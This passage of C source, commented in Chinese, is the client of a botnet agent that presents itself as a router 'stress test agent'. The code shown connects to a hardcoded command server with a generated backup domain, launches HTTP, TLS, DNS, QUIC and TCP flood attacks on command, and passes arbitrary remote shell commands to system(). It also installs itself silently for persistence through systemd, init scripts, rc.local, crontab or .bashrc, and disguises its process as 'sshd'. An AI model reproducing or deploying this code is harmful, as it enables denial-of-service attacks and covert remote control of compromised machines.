        params->target_port = atoi(tokens[3]);
        params->rate = atoi(tokens[4]);
        params->duration = atoi(tokens[5]);
        params->threads = atoi(tokens[6]);
        params->packet_size = atoi(tokens[7]);  // 新增：数据包大小参数
        params->concurrent = 10;
        strcpy(params->path, "/");
        
        // 设置默认数据包大小
        if (params->packet_size < MIN_PACKET_SIZE) {
            params->packet_size = 64;  // 默认最小包大小
        }
        if (params->packet_size > MAX_PACKET_SIZE) {
            params->packet_size = MAX_PACKET_SIZE;
        }
        
        // 解析可选参数
        int arg_index = 8;
        if (token_count > arg_index && (params->mode == MODE_HTTP || params->mode == MODE_TLS)) {
            strncpy(params->hostname, tokens[arg_index], sizeof(params->hostname) - 1);
            params->hostname[sizeof(params->hostname) - 1] = '\0';
            arg_index++;
        }
        if (token_count > arg_index && params->mode == MODE_HTTP) {
            strncpy(params->path, tokens[arg_index], sizeof(params->path) - 1);
            params->path[sizeof(params->path) - 1] = '\0';
            arg_index++;
        }
        if (token_count > arg_index) {
            params->concurrent = atoi(tokens[arg_index]);
            arg_index++;
        }
        if (params->mode == MODE_SHELL && token_count > 8) {
            // 合并shell命令
            strncpy(params->shell_cmd, tokens[8], sizeof(params->shell_cmd) - 1);
            params->shell_cmd[sizeof(params->shell_cmd) - 1] = '\0';
            for (int i = 9; i < token_count; i++) {
                strncat(params->shell_cmd, " ", sizeof(params->shell_cmd) - strlen(params->shell_cmd) - 1);
                strncat(params->shell_cmd, tokens[i], sizeof(params->shell_cmd) - strlen(params->shell_cmd) - 1);
            }
        }
		
		// 为新模式设置默认参数
        if (params->mode == MODE_TCP_CONN) {
            // TCP长连接需要并发连接数参数
            if (token_count > 8) {
                params->concurrent = atoi(tokens[8]);
            } else {
                params->concurrent = 100;  // 默认并发连接数
            }
        }
        
        if (params->mode == MODE_DNS && token_count > 8) {
            // DNS模式可指定查询域名
            strncpy(params->hostname, tokens[8], sizeof(params->hostname) - 1);
        }
        
        if ((params->mode == MODE_TLS || params->mode == MODE_QUIC) && token_count > 8) {
            // TLS/QUIC模式可指定SNI名称
            strncpy(params->hostname, tokens[8], sizeof(params->hostname) - 1);
        }
        
        return 1;
        
    } else if (strcmp(tokens[0], "stop") == 0) {
        return 2;
        
    } else if (strcmp(tokens[0], "ping") == 0 || strcmp(tokens[0], "PING") == 0) {
        return 3;
        
    } else if (strcmp(tokens[0], "shell") == 0 && token_count > 1) {
        params->mode = MODE_SHELL;
        params->duration = 0;
        params->threads = 1;
        params->packet_size = 0;  // Shell模式不需要包大小
        
        strncpy(params->shell_cmd, tokens[1], sizeof(params->shell_cmd) - 1);
        params->shell_cmd[sizeof(params->shell_cmd) - 1] = '\0';
        for (int i = 2; i < token_count; i++) {
            strncat(params->shell_cmd, " ", sizeof(params->shell_cmd) - strlen(params->shell_cmd) - 1);
            strncat(params->shell_cmd, tokens[i], sizeof(params->shell_cmd) - strlen(params->shell_cmd) - 1);
        }
        
        return 4;
    }
    
    return 0;
}

// 处理命令
static void handle_command(const char *cmd) {
    AttackParams params = {0};
    int result = parse_command(cmd, &params);
    
    switch (result) {
        case 1:
            start_attack(&params);
            break;
            
        case 2:
            stop_attack();
            break;
            
        case 3:
            // ping命令，不做特殊处理
            break;
            
        case 4:
            if (strlen(params.shell_cmd) > 0) {
                log_message("执行Shell命令: %s", params.shell_cmd);
                system(params.shell_cmd);
            }
            break;
            
        default:
            log_message("未知命令: %s", cmd);
            break;
    }
}

// 改进的域名解析函数
static struct hostent *resolve_hostname(const char *host) {
    // 尝试多个DNS服务器
    const char *dns_servers[] = {
        "8.8.8.8",      // Google DNS
        "8.8.4.4",      // Google DNS备用
        "1.1.1.1",      // Cloudflare DNS
        "114.114.114.114", // 国内DNS
        "223.5.5.5"     // 阿里DNS
    };
    
    // 临时设置DNS服务器
    for (int i = 0; i < sizeof(dns_servers) / sizeof(dns_servers[0]); i++) {
        // 注意：这种方法需要系统权限，通常我们使用系统默认解析
        // 这里只是记录尝试的DNS服务器
        log_message("尝试通过系统解析: %s (DNS服务器: %s)", host, dns_servers[i]);
    }
    
    // 使用系统默认解析
    struct hostent *he = gethostbyname(host);
    if (he == NULL) {
        log_message("域名解析失败: %s (错误: %d)", host, h_errno);
    }
    
    return he;
}

// 修改connect_to_controller函数，添加身份验证
static int connect_to_controller(const char *host) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(CTRL_SERVER_PORT);
    
    // 域名解析
    struct hostent *he = resolve_hostname(host);
    if (he == NULL) {
        close(sock);
        return -1;
    }
    
    memcpy(&serv_addr.sin_addr, he->h_addr, he->h_length);
    
    int result = connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    if (result < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }
    
    fd_set fdset;
    struct timeval tv;
    
    FD_ZERO(&fdset);
    FD_SET(sock, &fdset);
    tv.tv_sec = 3;  // 3秒超时
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fdset, NULL, &tv) == 1) {
        int so_error;
        socklen_t len = sizeof(so_error);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
        
        if (so_error == 0) {
            fcntl(sock, F_SETFL, flags);
            
            // ========== 新增：身份验证流程 ==========
            // 1. 发送hello请求
            const char *hello_msg = "hello\n";
            if (send(sock, hello_msg, strlen(hello_msg), 0) <= 0) {
                log_message("发送hello请求失败");
                close(sock);
                return -1;
            }
            
            // 2. 接收控制端返回的key
            char recv_key[256] = {0};
            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);
            tv.tv_sec = 3;  // 3秒超时
            tv.tv_usec = 0;
            
            if (select(sock + 1, &fdset, NULL, NULL, &tv) == 1) {
                ssize_t bytes = recv(sock, recv_key, sizeof(recv_key) - 1, 0);
                if (bytes <= 0) {
                    log_message("接收key失败");
                    close(sock);
                    return -1;
                }
                recv_key[bytes] = '\0';
                
                // 3. 移除可能的换行符
                char *newline = strchr(recv_key, '\n');
                if (newline) *newline = '\0';
                newline = strchr(recv_key, '\r');
                if (newline) *newline = '\0';
                
                // 4. 验证key是否匹配
                if (strcmp(recv_key, AUTH_KEY) != 0) {
                    log_message("身份验证失败: 期望key='%s', 收到key='%s'", AUTH_KEY, recv_key);
                    close(sock);
                    return -1;
                }
                
                log_message("身份验证成功");
                
                // 5. 发送客户端认证信息
                char hostname[256];
                gethostname(hostname, sizeof(hostname));
                char auth[512];
                snprintf(auth, sizeof(auth), "AGENT %s v%s\n", hostname, VERSION);
                
                if (send(sock, auth, strlen(auth), 0) <= 0) {
                    log_message("发送客户端认证失败");
                    close(sock);
                    return -1;
                }
                
                return sock;  // 验证成功，返回有效的socket
            } else {
                log_message("等待key响应超时");
                close(sock);
                return -1;
            }
        }
    }
    
    close(sock);
    return -1;
}

// 接收命令循环
static void command_loop(int sock) {
    char buffer[COMMAND_BUFFER];
    fd_set read_fds;
    struct timeval timeout;
    
    while (!global_stop) {
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        
        timeout.tv_sec = 2;
        timeout.tv_usec = 0;
        
        int activity = select(sock + 1, &read_fds, NULL, NULL, &timeout);
        
        if (activity < 0) {
            if (errno != EINTR) {
                log_message("select错误: %s", strerror(errno));
                break;
            }
        } else if (activity > 0 && FD_ISSET(sock, &read_fds)) {
            ssize_t bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes <= 0) {
                log_message("连接断开，接收字节数: %ld", bytes);
                break;
            }
            
            buffer[bytes] = '\0';
            
            char *line = buffer;
            char *next_line;
            
            while (line && *line) {
                next_line = strchr(line, '\n');
                if (next_line) {
                    *next_line = '\0';
                    next_line++;
                }
                
                char *cr = strchr(line, '\r');
                if (cr) *cr = '\0';
                
                if (strlen(line) > 0) {
                    // 特殊处理PING命令
                    if (strcmp(line, "PING") == 0 || strcmp(line, "ping") == 0) {
                        send(sock, "PONG\n", 5, 0);
                    } else {
                        handle_command(line);
                    }
                }
                
                line = next_line;
            }
        }
        
        if (current_attack.running && current_attack.duration > 0) {
            time_t now = time(NULL);
            if (now - current_attack.start_time >= current_attack.duration) {
                stop_attack();
            }
        }
    }
}

// ========================= 智能自启动安装（修复版） =========================
static int install_autostart(const char *binary_path) {
    int installed = 0;
    char src_path[PATH_MAX] = {0};
    char dest_path[PATH_MAX] = {0};
    char cmd[8192];
    
    int is_root = (getuid() == 0);
    
    if (is_root) {
        log_message("安装系统级自启动");
        
        // 1. 获取原始文件绝对路径
        if (binary_path[0] != '/') {
            char cwd[PATH_MAX];
            if (getcwd(cwd, sizeof(cwd)) != NULL) {
                snprintf(src_path, sizeof(src_path), "%s/%s", cwd, binary_path);
            } else {
                strncpy(src_path, binary_path, sizeof(src_path)-1);
            }
        } else {
            strncpy(src_path, binary_path, sizeof(src_path)-1);
        }
        
        // 2. 检查原始文件是否存在
        if (access(src_path, F_OK) != 0) {
            log_message("错误：源文件不存在: %s", src_path);
            return -1;
        }
        
        // 3. 将文件复制到系统目录
        // 尝试多个系统目录，按优先级
        const char *system_dirs[] = {
            "/usr/local/bin",      // 用户安装的程序
            "/usr/local/sbin",     // 系统管理程序
            "/usr/bin",           // 系统程序
            "/opt/stress_agent",  // 可选应用程序目录
            NULL
        };
        
        char *system_dir = NULL;
        for (int i = 0; system_dirs[i] != NULL; i++) {
            // 检查目录是否存在，如果不存在则创建
            struct stat st = {0};
            if (stat(system_dirs[i], &st) == -1) {
                // 尝试创建目录
                if (mkdir(system_dirs[i], 0755) == 0) {
                    system_dir = strdup(system_dirs[i]);
                    break;
                }
            } else {
                // 目录存在，检查是否可写
                if (access(system_dirs[i], W_OK) == 0) {
                    system_dir = strdup(system_dirs[i]);
                    break;
                }
            }
        }
        
        if (!system_dir) {
            // 如果所有系统目录都不可写，回退到临时目录
            system_dir = strdup("/tmp/stress_agent");
            mkdir(system_dir, 0755);
            log_message("警告：使用临时目录: %s", system_dir);
        }
        
        // 4. 复制文件到系统目录
        snprintf(dest_path, sizeof(dest_path), "%s/stress_agent", system_dir);
        
        FILE *src = fopen(src_path, "rb");
        FILE *dst = fopen(dest_path, "wb");
        
        if (!src || !dst) {
            if (src) fclose(src);
            if (dst) fclose(dst);
            log_message("错误：无法复制文件");
            free(system_dir);
            return -1;
        }
        
        char buffer[8192];
        size_t bytes_read;
        while ((bytes_read = fread(buffer, 1, sizeof(buffer), src)) > 0) {
            fwrite(buffer, 1, bytes_read, dst);
        }
        
        fclose(src);
        fclose(dst);
        
        // 5. 设置执行权限
        chmod(dest_path, 0755);
        log_message("文件已复制到: %s", dest_path);
        
        // 6. 检测系统类型
        int is_systemd = 0;
        int is_openwrt = 0;
        
        if (access("/run/systemd/system", F_OK) == 0 || 
            access("/lib/systemd/systemd", F_OK) == 0) {
            is_systemd = 1;
        }
        
        if (access("/etc/openwrt_release", F_OK) == 0 ||
            access("/etc/openwrt_version", F_OK) == 0) {
            is_openwrt = 1;
        }
        
        // 7. 安装自启动
        if (is_systemd) {
            // 创建 systemd 服务
            char service_path[PATH_MAX];
            snprintf(service_path, sizeof(service_path), 
                    "/etc/systemd/system/stress_agent.service");
            
            FILE *service = fopen(service_path, "w");
            if (service) {
                fprintf(service, "[Unit]\n");
                fprintf(service, "Description=Stress Test Agent v%s\n", VERSION);
                fprintf(service, "After=network.target\n");
                fprintf(service, "\n");
                fprintf(service, "[Service]\n");
                fprintf(service, "Type=simple\n");
                fprintf(service, "ExecStart=%s\n", dest_path);  // 添加 -f 参数
                fprintf(service, "Restart=always\n");
                fprintf(service, "RestartSec=5\n");
                fprintf(service, "\n");
                fprintf(service, "[Install]\n");
                fprintf(service, "WantedBy=multi-user.target\n");
                fclose(service);
                
                system("systemctl daemon-reload 2>/dev/null");
                system("systemctl enable stress_agent.service 2>/dev/null");
                log_message("已创建 systemd 服务: %s", service_path);
                installed = 1;
            } else {
                log_message("警告：无法创建 systemd 服务文件");
            }
        }
        
        if (!installed && is_openwrt) {
            // OpenWrt 系统
            char init_script[PATH_MAX];
            snprintf(init_script, sizeof(init_script), "/etc/init.d/stress_agent");
            
            FILE *script = fopen(init_script, "w");
            if (script) {
                fprintf(script, "#!/bin/sh /etc/rc.common\n");
                fprintf(script, "USE_PROCD=1\n");
                fprintf(script, "START=99\n");
                fprintf(script, "PROG=%s\n", dest_path);
                fprintf(script, "\n");
                fprintf(script, "start_service() {\n");
                fprintf(script, "    procd_open_instance\n");
                fprintf(script, "    procd_set_param command $PROG\n");
                fprintf(script, "    procd_set_param respawn\n");
                fprintf(script, "    procd_close_instance\n");
                fprintf(script, "}\n");
                fprintf(script, "\n");
                fprintf(script, "stop_service() {\n");
                fprintf(script, "    killall stress_agent 2>/dev/null\n");
                fprintf(script, "}\n");
                fclose(script);
                
                chmod(init_script, 0755);
                system("/etc/init.d/stress_agent enable 2>/dev/null");
                log_message("已创建 OpenWrt 服务: %s", init_script);
                installed = 1;
            }
        }
        
        if (!installed) {
            // 传统的 init.d 脚本
            char init_script[PATH_MAX];
            snprintf(init_script, sizeof(init_script), "/etc/init.d/stress_agent");
            
            FILE *script = fopen(init_script, "w");
            if (script) {
                fprintf(script, "#!/bin/sh\n");
                fprintf(script, "### BEGIN INIT INFO\n");
                fprintf(script, "# Provides:          stress_agent\n");
                fprintf(script, "# Required-Start:    $network\n");
                fprintf(script, "# Required-Stop:     $network\n");
                fprintf(script, "# Default-Start:     2 3 4 5\n");
                fprintf(script, "# Default-Stop:      0 1 6\n");
                fprintf(script, "# Description:       Stress Test Agent v%s\n", VERSION);
                fprintf(script, "### END INIT INFO\n");
                fprintf(script, "\n");
                fprintf(script, "case \"$1\" in\n");
                fprintf(script, "    start)\n");
                fprintf(script, "        %s &\n", dest_path);
                fprintf(script, "        ;;\n");
                fprintf(script, "    stop)\n");
                fprintf(script, "        killall stress_agent 2>/dev/null\n");
                fprintf(script, "        ;;\n");
                fprintf(script, "    restart)\n");
                fprintf(script, "        $0 stop\n");
                fprintf(script, "        sleep 1\n");
                fprintf(script, "        $0 start\n");
                fprintf(script, "        ;;\n");
                fprintf(script, "    *)\n");
                fprintf(script, "        echo \"Usage: $0 {start|stop|restart}\"\n");
                fprintf(script, "        exit 1\n");
                fprintf(script, "        ;;\n");
                fprintf(script, "esac\n");
                fprintf(script, "exit 0\n");
                fclose(script);
                
                chmod(init_script, 0755);
                system("which chkconfig >/dev/null 2>&1 && chkconfig --add stress_agent 2>/dev/null");
                system("which update-rc.d >/dev/null 2>&1 && update-rc.d stress_agent defaults 2>/dev/null");
                system("which rc-update >/dev/null 2>&1 && rc-update add stress_agent default 2>/dev/null");
                log_message("已创建 init.d 脚本: %s", init_script);
                installed = 1;
            }
        }
        
        // 8. 添加到 rc.local
        if (!installed) {
            const char *rc_files[] = {
                "/etc/rc.local",
                "/etc/rc.d/rc.local",
                "/etc/init.d/boot.local",
                NULL
            };
            
            for (int i = 0; rc_files[i] && !installed; i++) {
                if (access(rc_files[i], F_OK) == 0) {
                    FILE *rc = fopen(rc_files[i], "a");
                    if (rc) {
                        fprintf(rc, "# Stress Test Agent v%s\n", VERSION);
                        fprintf(rc, "%s &\n", dest_path);
                        fclose(rc);
                        chmod(rc_files[i], 0755);
                        log_message("已添加到: %s", rc_files[i]);
                        installed = 1;
                    }
                }
            }
        }
        
        // 9. 添加到 crontab
        if (!installed) {
            char crontab_cmd[2048];
            snprintf(crontab_cmd, sizeof(crontab_cmd),
                "crontab -l 2>/dev/null | grep -q 'stress_agent' || "
                "(crontab -l 2>/dev/null; echo '@reboot %s') | crontab - 2>/dev/null",
                dest_path);
            
            if (system(crontab_cmd) == 0) {
                log_message("已添加到 crontab");
                installed = 1;
            }
        }
        
        free(system_dir);
        
    } else {
        // 非root用户的安装逻辑（保持不变）
        log_message("安装用户级自启动");
        
        char *home = getenv("HOME");
        if (!home) {
            log_message("错误：无法获取用户家目录");
            return -1;
        }
        
        // 复制文件到用户目录
        char user_dir[PATH_MAX];
        snprintf(user_dir, sizeof(user_dir), "%s/.stress_agent", home);
        
        if (mkdir(user_dir, 0755) != 0 && errno != EEXIST) {
            log_message("无法创建用户目录: %s", user_dir);
            return -1;
        }
        
        snprintf(dest_path, sizeof(dest_path), "%s/stress_agent", user_dir);
        
        FILE *src = fopen(binary_path, "rb");
        FILE *dst = fopen(dest_path, "wb");
        
        if (!src || !dst) {
            if (src) fclose(src);
            if (dst) fclose(dst);
            return -1;
        }
        
        char buffer[8192];
        size_t bytes;
        while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
            fwrite(buffer, 1, bytes, dst);
        }
        
        fclose(src);
        fclose(dst);
        chmod(dest_path, 0755);
        
        // 用户级自启动
        const char *user_files[] = {
            ".bashrc", ".bash_profile", ".profile", ".zshrc", NULL
        };
        
        for (int i = 0; user_files[i]; i++) {
            char user_file[PATH_MAX];
            snprintf(user_file, sizeof(user_file), "%s/%s", home, user_files[i]);
            
            if (access(user_file, F_OK) == 0) {
                FILE *uf = fopen(user_file, "a");
                if (uf) {
                    fprintf(uf, "\n# Stress Test Agent\n");
                    fprintf(uf, "%s &\n", dest_path);
                    fclose(uf);
                    log_message("已添加到: %s", user_file);
                    installed = 1;
                    break;
                }
            }
        }
    }
    
    if (installed) {
        log_message("自启动安装完成，文件位置: %s", dest_path);
    } else {
        log_message("自启动安装失败");
    }
    
    return installed ? 0 : -1;
}

// 新增函数：检查是否从已安装目录启动
int is_installed_version() {
    char current_path[PATH_MAX];
    char real_current_path[PATH_MAX];
    
    // 获取当前进程的实际路径
    if (readlink("/proc/self/exe", current_path, sizeof(current_path)-1) == -1) {
        return 0;  // 获取失败，视为非安装版本
    }
    
    // 获取规范化路径
    if (realpath(current_path, real_current_path) == NULL) {
        return 0;
    }
    
    // 检查用户目录
    char *home = getenv("HOME");
    if (home) {
        char user_path[PATH_MAX];
        snprintf(user_path, sizeof(user_path), "%s/.stress_agent/stress_agent", home);
        
        char real_user_path[PATH_MAX];
        if (realpath(user_path, real_user_path) != NULL) {
            if (strcmp(real_current_path, real_user_path) == 0) {
                return 1;  // 从用户目录启动
            }
        }
    }
    
    // 检查系统目录
    const char *paths[] = {
        "/usr/local/bin/stress_agent",
        "/usr/local/sbin/stress_agent", 
        "/usr/bin/stress_agent",
        "/opt/stress_agent/stress_agent",
        NULL
    };
    
    for (int i = 0; paths[i]; i++) {
        char real_sys_path[PATH_MAX];
        if (realpath(paths[i], real_sys_path) != NULL) {
            if (strcmp(real_current_path, real_sys_path) == 0) {
                return 1;  // 从系统目录启动
            }
        }
    }
    
    return 0;  // 非安装版本
}

static int create_lock_simple(void);
static void remove_lock_simple(void);

// 定义防止重复运行的端口
#define SINGLETON_PORT 60005

// 全局变量，用于端口监听
static int singleton_sock = -1;

// 清理端口锁
static void cleanup_port_lock(void) {
    if (singleton_sock >= 0) {
        close(singleton_sock);
        singleton_sock = -1;
    }
}

static int daemonize_simple(char *argv[]);

// ========================= 主函数 =========================
int main(int argc, char *argv[]) {
    // === 第一步：保存原始可执行路径 ===
    char original_exe_path[PATH_MAX] = {0};
    
    // 方法1：尝试读取 /proc/self/exe（Linux）
    ssize_t len = readlink("/proc/self/exe", original_exe_path, sizeof(original_exe_path)-1);
    if (len > 0) {
        original_exe_path[len] = '\0';
    }
    // 方法2：如果方法1失败，保存原始 argv[0]
    else if (argv && argv[0]) {
        // 如果是相对路径，转换为绝对路径
        if (argv[0][0] != '/') {
            char cwd[PATH_MAX];
            if (getcwd(cwd, sizeof(cwd))) {
                snprintf(original_exe_path, sizeof(original_exe_path), "%s/%s", cwd, argv[0]);
            } else {
                strncpy(original_exe_path, argv[0], sizeof(original_exe_path)-1);
            }
        } else {
            strncpy(original_exe_path, argv[0], sizeof(original_exe_path)-1);
        }
    }
    
    // 设置进程名
    prctl(PR_SET_NAME, "sshd");
    
    // 修改argv[0]来伪装进程
    if (argv && argv[0]) {
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], "sshd: [main]");
    }
    
    int foreground = 0;
    int is_root = 0;
    
    // 检测是否为root用户
    is_root = (getuid() == 0);
    
    // 解析命令行参数
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--foreground") == 0 || strcmp(argv[i], "-f") == 0) {
            foreground = 1;
            daemon_mode = 0;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            // 帮助信息仍然显示
            printf("路由器压力测试被控端 v%s (支持包大小控制)\n", VERSION);
            printf("控制端: %s:%d\n", CTRL_SERVER_IP, CTRL_SERVER_PORT);
            printf("支持数据包大小: %d-%d 字节\n", MIN_PACKET_SIZE, MAX_PACKET_SIZE);
            printf("运行用户: %s\n", is_root ? "root" : "非root");
            printf("单例检测端口: %d\n", SINGLETON_PORT);
            printf("\n用法: %s [选项]\n", argv[0]);
            printf(" -f, --foreground 前台运行\n");
            printf(" -h, --help 显示帮助\n");
            return 0;
        } else {
            fprintf(stderr, "错误：未知参数 %s\n", argv[i]);
            fprintf(stderr, "使用 -h 参数查看帮助\n");
            return 1;
        }
    }
    
    // === 后台模式处理：重定向输出到/dev/null ===
    if (!foreground) {
        // 后台模式，重定向标准输出和标准错误到/dev/null
        int null_fd = open("/dev/null", O_RDWR);
        if (null_fd >= 0) {
            // 保存原始的stdout和stderr文件描述符
            int original_stdout = dup(STDOUT_FILENO);
            int original_stderr = dup(STDERR_FILENO);
            
            // 重定向stdout和stderr到/dev/null
            dup2(null_fd, STDOUT_FILENO);
            dup2(null_fd, STDERR_FILENO);
            close(null_fd);
            
            // 后续输出都将被重定向到/dev/null
            // 如果需要在前台模式恢复输出，可以保存original_stdout和original_stderr
        }
    }
    
    // === 自动安装 ===
    // 仅在后台模式时自动安装
    if (!foreground) {
        // 检查是否已从安装目录启动
        if (is_installed_version()) {
            // printf("已从安装目录启动，跳过自动安装\n");  // 后台模式下不显示
        } else {
            // printf("后台模式，执行自动安装...\n");  // 后台模式下不显示
            int result = install_autostart(original_exe_path);  // 使用保存的原始路径
            if (result == 0) {
                // printf("自启动安装%s\n", is_root ? "（系统级）成功" : "（用户级）成功");  // 不显示
                // printf("从新位置启动程序...\n");  // 不显示
                
                // 先检查用户目录
                char *home = getenv("HOME");
                if (home) {
                    char user_path[PATH_MAX];
                    snprintf(user_path, sizeof(user_path), "%s/.stress_agent/stress_agent", home);
                    
                    if (access(user_path, X_OK) == 0) {
                        // printf("从用户目录启动: %s\n", user_path);  // 不显示
                        
                        // 构建启动命令
                        char cmd[PATH_MAX + 20];
                        // 保持前台/后台标志
                        if (foreground) {
                            snprintf(cmd, sizeof(cmd), "%s -f &", user_path);
                        } else {
                            snprintf(cmd, sizeof(cmd), "%s &", user_path);
                        }
                        
                        // printf("执行: %s\n", cmd);  // 不显示
                        int ret = system(cmd);
                        
                        if (ret == 0) {
                            // printf("新程序启动成功，当前进程退出\n");  // 不显示
                            return 0;
                        } else {
                            // printf("启动失败，错误码: %d\n", ret);  // 不显示
                        }
                    }
                }
                
                // 检查其他位置
                const char *paths[] = {
                    "/usr/local/bin/stress_agent",
                    "/usr/local/sbin/stress_agent", 
                    "/usr/bin/stress_agent",
                    "/opt/stress_agent/stress_agent",
                    NULL
                };
                
                for (int i = 0; paths[i]; i++) {
                    if (access(paths[i], X_OK) == 0) {
                        // printf("从系统目录启动: %s\n", paths[i]);  // 不显示
                        
                        char cmd[PATH_MAX + 20];
                        if (foreground) {
                            snprintf(cmd, sizeof(cmd), "%s -f &", paths[i]);
                        } else {
                            snprintf(cmd, sizeof(cmd), "%s &", paths[i]);
                        }
                        
                        // printf("执行: %s\n", cmd);  // 不显示
                        int ret = system(cmd);
                        
                        if (ret == 0) {
                            // printf("新程序启动成功，当前进程退出\n");  // 不显示
                            return 0;
                        } else {
                            // printf("启动失败，错误码: %d\n", ret);  // 不显示
                        }
                    }
                }
                
                // printf("启动新程序失败，继续运行当前程序...\n");  // 不显示
            } else {
                // printf("自启动安装失败\n");  // 不显示
            }
        }
    } else {
        // 前台模式仍然显示
        printf("前台模式，跳过自动安装\n");
    }
    
    // === 第三步：单例检测（在安装尝试之后，主循环之前）===
    // 只有当我们没有在安装时启动新程序，或者启动新程序失败时，才进行单例检测
    
    // 前台模式下显示，后台模式下不显示
    if (foreground) {
        printf("单例检测：端口 %d\n", SINGLETON_PORT);
    }
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        // 后台模式下，错误信息仍通过stderr输出，但已被重定向到/dev/null
        // fprintf(stderr, "错误：创建socket失败 (%s)\n", strerror(errno));
        // fprintf(stderr, "程序无法启动，立即退出\n");
        return 1;
    }
    
    // 设置端口重用，避免TIME_WAIT状态
    int reuse = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0) {
        // fprintf(stderr, "错误：设置socket选项失败 (%s)\n", strerror(errno));
        // fprintf(stderr, "程序无法启动，立即退出\n");
        close(sock);
        return 1;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(SINGLETON_PORT);
    
    // 尝试绑定端口
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        if (errno == EADDRINUSE) {
            // fprintf(stderr, "错误：端口 %d 已被占用\n", SINGLETON_PORT);
            // fprintf(stderr, "程序已在运行中，当前实例立即退出\n");
        } else {
            // fprintf(stderr, "错误：绑定端口失败 (%s)\n", strerror(errno));
            // fprintf(stderr, "程序无法启动，立即退出\n");
        }
        close(sock);
        return 1;  // 立即退出
    }
    
    // 开始监听
    if (listen(sock, 1) < 0) {
        // fprintf(stderr, "错误：监听端口失败 (%s)\n", strerror(errno));
        // fprintf(stderr, "程序无法启动，立即退出\n");
        close(sock);
        return 1;
    }
    
    // 保存socket用于后续清理
    singleton_sock = sock;
    atexit(cleanup_port_lock);
    
    // 前台模式下显示，后台模式下不显示
    if (foreground) {
        printf("单例检测通过，端口锁定成功\n");
    }
    
    // === 第四步：常规运行检查 ===
    // 检查控制端口权限
    if (!is_root && CTRL_SERVER_PORT < 1024) {
        // 后台模式下不显示警告
        if (foreground) {
            fprintf(stderr, "警告：非root用户无法使用1024以下端口连接服务器\n");
            fprintf(stderr, "当前端口: %d，建议使用root权限运行\n", CTRL_SERVER_PORT);
        }
    }
    
    // 注册信号处理
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGUSR1, signal_handler);
    signal(SIGUSR2, signal_handler);
    signal(SIGPIPE, SIG_IGN);
    
    // 守护进程化处理
    if (!foreground) {
        if (!is_root) {
            // printf("注意：非root用户运行后台模式\n");  // 后台模式下不显示
        }
        if (daemonize_simple(argv) < 0) {  // 传递argv参数
            cleanup_port_lock();
            return 1;
        }
    }
    
    // 记录启动信息
    log_message("路由器压力测试被控端 v%s 启动", VERSION);
    log_message("控制端: %s:%d", CTRL_SERVER_IP, CTRL_SERVER_PORT);
    log_message("运行用户: %s (UID: %d)", is_root ? "root" : "非root", getuid());
    log_message("单例检测端口: %d", SINGLETON_PORT);
    
    // 主循环变量
    int client_sock = -1;
    reconnect_count = 0;
    int use_backup_domain = 0;
    int backup_try_count = 0;
    time_t backup_domain_time = 0;
    char current_backup_domain[256] = {0};
    int use_primary_first = 1;
    
    // 主循环
    while (!global_stop) {
        int connected = 0;
        time_t now = time(NULL);
        
        // 刷新备用域名
        if (now - backup_domain_time >= 60 || strlen(current_backup_domain) == 0) {
            generate_backup_domain(current_backup_domain, sizeof(current_backup_domain));
            backup_domain_time = now;
            backup_try_count = 0;
            log_message("刷新备用域名: %s", current_backup_domain);
        }
        
        // 尝试连接主服务器
        if (use_primary_first) {
            log_message("尝试连接主服务器: %s:%d", CTRL_SERVER_IP, CTRL_SERVER_PORT);
            client_sock = connect_to_controller(CTRL_SERVER_IP);
            if (client_sock >= 0) {
                log_message("主服务器连接成功");
                use_backup_domain = 0;
                backup_try_count = 0;
                reconnect_count = 0;
                
                // 命令处理循环
                command_loop(client_sock);
                
                // 清理
                stop_attack();
                if (client_sock >= 0) {
                    close(client_sock);
                    client_sock = -1;
                }
                
                if (!global_stop) {
                    log_message("连接断开，5秒后重试");
                }
                connected = 1;
            } else {
                log_message("主服务器连接失败，尝试备用域名");
                use_primary_first = 0;
            }
        }
        
        // 尝试备用域名
        if (!connected && !global_stop && strlen(current_backup_domain) > 0) {
            log_message("尝试连接备用域名: %s:%d", current_backup_domain, CTRL_SERVER_PORT);
            client_sock = connect_to_controller(current_backup_domain);
            if (client_sock >= 0) {
                log_message("备用域名连接成功");
                backup_try_count = 0;
                reconnect_count = 0;
                
                command_loop(client_sock);
                stop_attack();
                if (client_sock >= 0) {
                    close(client_sock);
                    client_sock = -1;
                }
                
                if (!global_stop) {
                    log_message("连接断开，5秒后重试");
                }
                connected = 1;
                use_backup_domain = 1;
            } else {
                backup_try_count++;
                log_message("备用域名连接失败（第%d次）", backup_try_count);
                if (backup_try_count >= 3) {
                    use_primary_first = 1;
                    use_backup_domain = 0;
                    backup_try_count = 0;
                }
            }
        }
        
        // 等待重试
        if (!connected && !global_stop) {
            sleep(5);
        }
    }
    
    // 清理退出
    stop_attack();
    cleanup_port_lock();
    if (client_sock >= 0) {
        close(client_sock);
    }
    pthread_mutex_destroy(&attack_mutex);
    log_message("程序退出");
    
    return 0;
}

static int daemonize_simple(char *argv[]) {
    pid_t pid = fork();
    
    if (pid < 0) {
        perror("fork");
